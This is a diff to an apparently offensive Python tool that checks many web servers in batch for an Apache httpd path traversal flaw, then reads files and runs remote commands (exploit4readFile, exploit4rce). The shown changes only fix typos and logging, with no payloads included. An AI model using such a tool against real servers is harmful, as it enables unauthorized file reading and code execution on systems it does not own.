@@ -85,13 +85,13 @@ def checkApacheHttpdPathTraversal(url,timeout):
                     #break
 
             except Exception as e:
-                print("[use poc" + str(pocList.index(poc)) +"] " + "<" + url + cdir + ">" + " cauused exception.")
+                print("[use poc" + str(pocList.index(poc)) +"] " + "<" + url + cdir + ">" + " caused exception.")
                 print(e)
         #if isVulnerable:
         #    break
 
     #if(isVulnerable == False):
-    print("[use all poc" + str(pocList.index(poc)) +"] " + "<" + url + ">" + " attacked fail.")
+    print("[use all poc] " + "<" + url + ">" + " attacked fail.")
     return False
 
 def checkApacheHttpdPathTraversalBatch(urlQueue,timeout):
@@ -105,7 +105,7 @@ def checkApacheHttpdPathTraversalBatch(urlQueue,timeout):
         try:
         
             url = urlQueue.get()
-            print(url)
+            #print(url)
             qcount = urlQueue.qsize()
             print("Checking " + url + "---[" + str(countLines - qcount) + "/" + str(countLines) + "]")
             vulnerableUrlCdir = checkApacheHttpdPathTraversal(url,timeout)
@@ -134,7 +134,7 @@ def exploit4readFile(url,commonDir,timeout):
         print(rsp1Content)
 
     except Exception as e:
-        print("[use poc" + choosePoc +"] " + "<" + url + commonDir + ">" + " cauused exception.")
+        print("[use poc" + choosePoc +"] " + "<" + url + commonDir + ">" + " caused exception.")
         print(e)
 
 
@@ -166,7 +166,7 @@ def exploit4rce(url,commonDir,rceShell,timeout):
             print(rsp2Content)
 
         except Exception as e:
-            print("[use poc" + choosePoc +"+" + rcePostDataList[int(choosePostDataFormat)] + "] " + "<" + url + commonDir + ">" + " cauused exception.")
+            print("[use poc" + choosePoc +"+" + rcePostDataList[int(choosePostDataFormat)] + "] " + "<" + url + commonDir + ">" + " caused exception.")
             print(e)
 
 
